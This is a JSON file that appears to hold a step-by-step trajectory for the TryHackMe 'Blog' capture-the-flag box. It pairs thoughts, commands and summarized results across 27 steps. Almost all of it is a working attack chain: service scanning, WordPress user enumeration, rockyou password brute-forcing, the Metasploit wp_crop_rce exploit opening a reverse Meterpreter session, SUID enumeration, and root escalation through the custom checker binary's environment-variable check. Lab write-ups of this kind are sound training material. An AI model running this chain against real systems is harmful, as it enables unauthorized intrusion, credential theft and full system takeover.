@@ -1,0 +1,167 @@
+{
+    "initial_prompt": "Penetrate the target machine (IP: `10.10.109.33`) in the \"Blog\" TryHackMe challenge. The objective is to identify and exploit vulnerabilities in a WordPress-based blog to gain initial access, escalate privileges, and capture `user.txt` and `root.txt`. The attacker's machine is Kali 2024.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Identify open ports and services on the target machine to understand potential attack surfaces.",
+            "command": "nmap -sV -sC 10.10.109.33",
+            "result": "Nmap scan reveals open ports: 22/tcp (SSH OpenSSH), 80/tcp (HTTP Apache httpd), 139/tcp (netbios-ssn Samba smbd), 445/tcp (microsoft-ds Samba smbd). Port 80 is hosting a WordPress site. SSH and SMB services are also available."
+        },
+        {
+            "step_number": 2,
+            "thought": "Configure the local system to resolve the domain `blog.thm` to the target IP for easier interaction with the WordPress site.",
+            "command": "echo \"10.10.109.33 blog.thm\" | sudo tee -a /etc/hosts",
+            "result": "The entry `10.10.109.33 blog.thm` is successfully added to the `/etc/hosts` file. This allows accessing the target WordPress site via `http://blog.thm/` in tools and browsers."
+        },
+        {
+            "step_number": 3,
+            "thought": "Enumerate WordPress users and version using WPScan. An API token might be needed for full functionality.",
+            "command": "wpscan --url http://blog.thm/ -e --api-token YOUR_WPSCAN_API_TOKEN",
+            "result": "WPScan with the `-e` (enumerate all) flag scans `http://blog.thm/`. It identifies WordPress version 5.0. User enumeration reveals usernames including `kwheel` and `bjoel`. This information is critical for targeted exploitation."
+        },
+        {
+            "step_number": 4,
+            "thought": "Create a user list file containing the identified usernames for brute-forcing WordPress credentials.",
+            "command": "echo -e \"kwheel\\nbjoel\" > user.txt",
+            "result": "A file named `user.txt` is created in the current directory, containing the usernames `kwheel` and `bjoel`, each on a new line. This file will be used as input for WPScan's password attack module."
+        },
+        {
+            "step_number": 5,
+            "thought": "Ensure the `rockyou.txt` wordlist is available and uncompressed for the password attack. Decompress if it's gzipped.",
+            "command": "if [ -f /usr/share/wordlists/rockyou.txt.gz ] && [ ! -f /usr/share/wordlists/rockyou.txt ]; then sudo gunzip /usr/share/wordlists/rockyou.txt.gz; fi",
+            "result": "Checked for `rockyou.txt`. If `/usr/share/wordlists/rockyou.txt.gz` existed and `/usr/share/wordlists/rockyou.txt` did not, the `.gz` file has been decompressed. The wordlist `/usr/share/wordlists/rockyou.txt` is now ready for use."
+        },
+        {
+            "step_number": 6,
+            "thought": "Brute-force WordPress credentials using the identified usernames and the `rockyou.txt` wordlist.",
+            "command": "wpscan --url http://blog.thm/ --passwords /usr/share/wordlists/rockyou.txt --usernames user.txt --api-token YOUR_WPSCAN_API_TOKEN",
+            "result": "WPScan performs a password attack against `http://blog.thm/` using `user.txt` and `rockyou.txt`. It successfully discovers the credentials for user `kwheel` as `cutiepie1`."
+        },
+        {
+            "step_number": 7,
+            "thought": "Exploit the WordPress 5.0 RCE vulnerability using Metasploit to gain initial access.",
+            "command": "msfconsole -q -x \"use exploit/multi/http/wp_crop_rce; set RHOSTS 10.10.109.33; set USERNAME kwheel; set PASSWORD cutiepie1; set LHOST tun0; exploit\"",
+            "result": "Metasploit successfully exploits the `wp_crop_rce` vulnerability on the target. A Meterpreter session is opened, providing initial access as the `www-data` user. (LHOST `tun0` assumes a VPN interface; adjust if necessary)."
+        },
+        {
+            "step_number": 8,
+            "thought": "List files in bjoel's home directory using the Meterpreter session to look for interesting files.",
+            "command": "ls /home/bjoel",
+            "result": "Meterpreter's `ls` command lists the contents of `/home/bjoel` on the target machine. Files such as `user.txt` and `Billy_Joel_Termination_May20-2020.pdf` are observed."
+        },
+        {
+            "step_number": 9,
+            "thought": "Read the `user.txt` file found in bjoel's home directory. This is suspected to be a decoy.",
+            "command": "cat /home/bjoel/user.txt",
+            "result": "Meterpreter's `cat` command displays the content of `/home/bjoel/user.txt`. The content suggests this is a decoy flag."
+        },
+        {
+            "step_number": 10,
+            "thought": "Download the PDF file from bjoel's home directory for offline analysis.",
+            "command": "download /home/bjoel/Billy_Joel_Termination_May20-2020.pdf",
+            "result": "The file `Billy_Joel_Termination_May20-2020.pdf` is downloaded from the target's `/home/bjoel/` directory to the attacker's current working directory via Meterpreter."
+        },
+        {
+            "step_number": 11,
+            "thought": "Drop into a system shell from the Meterpreter session to execute system commands.",
+            "command": "shell",
+            "result": "The Meterpreter `shell` command provides a basic, non-interactive system shell on the target machine as the `www-data` user."
+        },
+        {
+            "step_number": 12,
+            "thought": "Upgrade the basic shell to a fully interactive TTY shell for better usability.",
+            "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "result": "The Python one-liner successfully spawns an interactive Bash shell (TTY), running as `www-data`."
+        },
+        {
+            "step_number": 13,
+            "thought": "Confirm the current user identity in the interactive shell.",
+            "command": "id",
+            "result": "The `id` command output confirms the current user is `uid=33(www-data) gid=33(www-data) groups=33(www-data)`."
+        },
+        {
+            "step_number": 14,
+            "thought": "Search for SUID binaries on the system that could be exploited for privilege escalation.",
+            "command": "find / -perm -u=s -type f 2>/dev/null",
+            "result": "The `find` command lists all SUID binaries. Among them, `/usr/sbin/checker` is identified as a non-standard SUID binary, potentially custom and vulnerable."
+        },
+        {
+            "step_number": 15,
+            "thought": "Execute the `checker` binary as `www-data` to observe its default behavior.",
+            "command": "/usr/sbin/checker",
+            "result": "Running `/usr/sbin/checker` as `www-data` outputs the message 'Not an Admin', indicating it performs some privilege check."
+        },
+        {
+            "step_number": 16,
+            "thought": "Exit the Python-upgraded TTY shell to return to the basic system shell.",
+            "command": "exit",
+            "result": "Exited the interactive Bash (TTY) shell, returning to the basic system shell provided by Meterpreter's `shell` command."
+        },
+        {
+            "step_number": 17,
+            "thought": "Exit the basic system shell to return to the Meterpreter prompt.",
+            "command": "exit",
+            "result": "Exited the basic system shell, returning to the Meterpreter prompt (`meterpreter >`)."
+        },
+        {
+            "step_number": 18,
+            "thought": "Download the `checker` SUID binary from the target to the attacker machine for local analysis.",
+            "command": "download /usr/sbin/checker",
+            "result": "The `/usr/sbin/checker` binary is downloaded from the target machine to the attacker's current working directory via Meterpreter."
+        },
+        {
+            "step_number": 19,
+            "thought": "Perform a quick local analysis of the downloaded `checker` binary using `strings` to find clues.",
+            "command": "strings ./checker",
+            "result": "The `strings` command output from `./checker` might reveal hardcoded strings, function names, or environment variables (like 'admin' or 'pavan'). Full reverse engineering (e.g., with Ghidra) would confirm it checks an environment variable."
+        },
+        {
+            "step_number": 20,
+            "thought": "Re-enter a system shell from Meterpreter to attempt exploitation of the `checker` binary.",
+            "command": "shell",
+            "result": "A basic system shell as `www-data` is obtained again from Meterpreter."
+        },
+        {
+            "step_number": 21,
+            "thought": "Upgrade to an interactive TTY shell again for setting environment variables.",
+            "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "result": "An interactive Bash (TTY) shell as `www-data` is spawned."
+        },
+        {
+            "step_number": 22,
+            "thought": "Set the 'admin' environment variable to 'pavan' as discovered from analyzing the `checker` binary.",
+            "command": "export admin=pavan",
+            "result": "The environment variable `admin` is successfully set to `pavan` for the current shell session."
+        },
+        {
+            "step_number": 23,
+            "thought": "Execute the `checker` binary with the 'admin' environment variable set to escalate privileges.",
+            "command": "/usr/sbin/checker",
+            "result": "Executing `/usr/sbin/checker` with the `admin=pavan` environment variable set successfully spawns a new shell. The prompt typically changes to `#`, indicating root privileges."
+        },
+        {
+            "step_number": 24,
+            "thought": "Confirm root access in the new shell.",
+            "command": "id",
+            "result": "The `id` command output confirms `uid=0(root) gid=0(root) groups=0(root)`, indicating successful privilege escalation to root."
+        },
+        {
+            "step_number": 25,
+            "thought": "Read the root flag from `/root/root.txt`.",
+            "command": "cat /root/root.txt",
+            "result": "The contents of `/root/root.txt` are displayed, which is the root flag, completing one of the main objectives."
+        },
+        {
+            "step_number": 26,
+            "thought": "Search for the actual `user.txt` file, as the one in `/home/bjoel/` was a decoy.",
+            "command": "find / -name \"user.txt\" 2>/dev/null",
+            "result": "The `find` command lists all occurrences of `user.txt`. In addition to `/home/bjoel/user.txt`, another file `/media/usb/user.txt` is found, which is the likely location of the true user flag."
+        },
+        {
+            "step_number": 27,
+            "thought": "Read the user flag from `/media/usb/user.txt`.",
+            "command": "cat /media/usb/user.txt",
+            "result": "The contents of `/media/usb/user.txt` are displayed, which is the actual user flag, completing the final objective of the challenge."
+        }
+    ]
+}
